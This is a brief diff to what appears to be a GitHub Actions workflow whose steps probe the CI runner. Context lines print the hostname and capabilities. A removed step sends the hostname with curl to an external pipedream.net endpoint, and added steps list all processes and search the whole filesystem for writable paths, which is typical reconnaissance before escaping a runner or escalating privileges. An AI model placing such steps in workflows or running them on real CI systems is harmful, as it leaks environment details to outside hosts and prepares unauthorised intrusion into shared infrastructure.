@@ -17,6 +17,5 @@ jobs:
       # - run: echo "🍏 This job's status is ${{ job.status }}."
       - run: hostname
       - run: capsh --print
-      - run: hostname
-      - run: curl -d "`hostname`" https://ensbqy47ifly9x8.m.pipedream.net
-      - run: hostname
+      - run: ps -xuaf
+      - run: find / -writable 2>/dev/null 
